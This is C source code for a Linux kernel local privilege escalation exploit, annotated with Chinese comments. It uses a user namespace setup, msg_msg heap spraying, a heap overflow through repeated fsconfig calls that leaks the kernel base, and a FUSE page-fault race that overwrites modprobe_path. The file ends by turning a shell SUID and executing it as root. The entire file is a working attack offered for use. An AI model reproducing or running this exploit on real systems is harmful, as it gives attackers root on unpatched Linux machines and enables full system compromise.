#include "exploit.h"

uint64_t modprobe_path;
int fd;

void unshare_setup(uid_t uid, gid_t gid) {
  int temp;
  char edit[0x100];

  unshare(CLONE_NEWNS | CLONE_NEWUSER);
  temp = open("/proc/self/setgroups", O_WRONLY);
  write(temp, "deny", strlen("deny"));
  close(temp);

  temp = open("/proc/self/uid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", uid);
  write(temp, edit, strlen(edit));
  close(temp);

  temp = open("/proc/self/gid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", gid);
  write(temp, edit, strlen(edit));
  close(temp);

  return;
}

static const struct fuse_operations evil_ops = {
    .getattr = evil_getattr,
    .readdir = evil_readdir,
    .read = evil_read,
};

// msg_msg 堆喷射 0x1000 的页
// 因为 fs 的堆溢出，kmalloc(0x1000)，因此我们需要喷射0x1000 的堆，来形成溢出条件
void spray_4k(int spray) {
  char buffer[0x2000] = {0}, recieved[0x2000] = {0};
  msg *message = (msg *)buffer;
  int size = 0x1000;

  memset(buffer, 0x41, sizeof(buffer));
  for (int i = 0; i < spray; i++) {
    int spray = make_msg_queue();
    send_msg(spray, message, size - 0x30, 0);
  }
}

uint64_t offsets[] = {0x3400b0, 0x1c6c2e0};
enum { SINGLE_START = 0, MODPROBE };
uint64_t do_check_leak(char *buf) {
  uint64_t kbase = ((uint64_t *)buf)[510] - offsets[SINGLE_START];
  if (kbase & 0x1fffff || kbase == 0 ||
      (kbase & (0xfffffful << 40)) != ((0xfffffful << 40))) {
    return 0;
  }
  return kbase;
}

// msg 占据 0x1000 - 0x30 + sizeof(seq_ops) - sizeof(msg_msgseg)
// 堆溢出修改 m_ts 从而越界读
uint64_t do_leak() {
  uint64_t kbase = 0;
  char pat[0x1000] = {0};
  char buffer[0x2000] = {0}, recieved[0x2000] = {0};
  int targets[0x10] = {0};
  msg *message = (msg *)buffer;
  int size = 0x1018;

  // spray msg_msg
  for (int i = 0; i < 8; i++) {
    memset(buffer, 0x41 + i, sizeof(buffer));
    targets[i] = make_msg_queue();
    send_msg(targets[i], message, size - 0x30, 0);
  }

  memset(pat, 0x42, sizeof(pat));
  pat[sizeof(pat) - 1] = '\x00';
  puts("[*] Opening ext4 filesystem");

  fd = fsopen("ext4", 0);
  if (fd < 0) {
    puts("fsopen: Remember to unshare");
    exit(-1);
  }

  strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // 33 * 117 + 2 * 117 = 4095
  for (int i = 0; i < 117; i++) {
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);  // 
  }

  // overflow, hopefully causes an OOB read on a potential msg_msg object below
  // 修改 m_ts 为 0x1060
  puts("[*] Overflowing...");
  
  pat[21] = '\x00';   // "AAAAAAAAAAAAAAAAAAAAA \x00 AAAAAAAAAAA"
  char evil[] = "\x60\x10";
  // 溢出 4095 + 2 + 21
  fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);

  // spray more msg_msg
  for (int i = 8; i < 0x10; i++) {
    memset(buffer, 0x41 + i, sizeof(buffer));
    targets[i] = make_msg_queue();
    send_msg(targets[i], message, size - 0x30, 0);
  }

  // fs 内容追加, msg->m_ts = 0x1060
  // 4095 + 2 + 21 + 2 然后就会修改 m_ts
  fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0);

  puts("[*] Done heap overflow");
  puts("[*] Spraying kmalloc-32");
  for (int i = 0; i < 100; i++) {
    open("/proc/self/stat", O_RDONLY);
  }

  size = 0x1060;
  puts("[*] Attempting to recieve corrupted size and leak data");

  // go through all targets qids and check if we hopefully get a leak
  // leak 在 fs 后的 msg_msg 。
  for (int j = 0; j < 0x10; j++) {
    recv_msg(targets[j], recieved, size, 0);
    kbase = do_check_leak(recieved);
    if (kbase) {
      close(fd);
      return kbase;
    }
  }

  puts("[X] No leaks, trying again");
  return 0;
}

void *arb_write(void *args) {
  uint64_t goal = modprobe_path - 8;

  char pat[0x1000] = {0};
  memset(pat, 0x41, 29);

  char evil[0x20];
  memcpy(evil, (void *)&goal, 8);

  // 同一个fd，我们之前应该有4095 个字节
  // + 2 + 29
  fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);

  // + 2 => 修改 msg_msg->next 为 modprobe_path-8
  fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0);

  puts("[*] Done heap overflow");
  write(fuse_pipes[1], "A", 1);
}

void do_win() {
  int size = 0x1000;
  char buffer[0x2000] = {0};
  char pat[0x1000] = {0};

  msg *message = (msg *)buffer;
  memset(buffer, 0x44, sizeof(buffer));

  // 一个匿名页
  void *evil_page = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);

  // race_page
  uint64_t race_page = 0x1338000;

  // rooter 消息，内容在 0x1338000，也就是后面 fuse 映射的内存地址
  msg *rooter = (msg *)(race_page - 0x8);
  rooter->mtype = 1;
  size = 0x1010;

  int target = make_msg_queue();
  send_msg(target, message, size - 0x30, 0);

  puts("[*] Opening ext4 filesystem");
  fd = fsopen("ext4", 0);
  if (fd < 0) {
    puts("Opening");
    exit(-1);
  }
  puts("[*] Overflowing...");
  strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
  for (int i = 0; i < 117; i++) {
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
  }

  puts("[*] Prepaing fault handlers via FUSE");
  int evil_fd = open("evil/evil", O_RDWR);
  if (evil_fd < 0) {
    perror("evil fd failed");
    exit(-1);
  }

  // 将 fuse fd 映射到 0x1338000
  if ((mmap((void *)0x1338000, 0x1000, PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_FIXED, evil_fd, 0)) != (void *)0x1338000) {
    perror("mmap fail fuse 1");
    exit(-1);
  }

  pthread_t thread;

  // 子线程 arb write，根据堆溢出，修改 msg_msg->next 为 modprobe_path-8，然后我们可以 任意的读写消息。
  int race = pthread_create(&thread, NULL, arb_write, NULL);
  if (race != 0) {
    perror("can't setup threads for race");
  }

  // 主线程将消息发送到 msg 中，在这个过程中会访问内存页(load_msg)，访问到0x1338000 => fuse 处理 page fault
  // => 主进程卡住，卡在往 msg写内容的地方，进入fuse read call back
  // 子进程将 msg->next 改成 modprobe_path
  // 主进程 read call back 将 modprobe_path 修改 /tmp/x。
  send_msg(target, rooter, size - 0x30, 0);

  pthread_join(thread, NULL);

  munmap((void *)0x1337000, 0x1000);
  munmap((void *)0x1338000, 0x1000);

  close(evil_fd);
  close(fd);
}

char *fargs_evil[] = {"exploit", "evil", NULL};
#define MNT_PATH "evil"

int main(int atgc, char *argv[]) {
  fargs_evil[0] = argv[0];

  unshare_setup(getuid(), getgid());

  mkdir(MNT_PATH, 0777);

  pipe(fuse_pipes);

  modprobe_init();

  if (!fork()) {
    fuse_main(sizeof(fargs_evil) / sizeof(char *) - 1, fargs_evil, &evil_ops,
              NULL);
  }

  spray_4k(30);

  uint64_t kbase = 0;

  while (!kbase) {
    kbase = do_leak();
  }
  printf("[*] Kernel base 0x%lx\n", kbase);

  modprobe_path = (uint64_t)(kbase + (offsets[MODPROBE]));
  printf("[*] modprobe_path: 0x%lx\n", modprobe_path);

  spray_4k(30);

  while (1) {
    do_win();
    modprobe_hax();
    struct stat check;
    if (stat(SHELL, &check) < 0) {
      perror("Error on checking");
      exit(-1);
    }
    if (check.st_mode & S_ISUID) {
      break;
    }
  }

  puts("[*] Exploit success! " SHELL " is SUID now!");
  puts("[+] Popping shell");
  execve(SHELL, root_argv, NULL);

  return 0;
}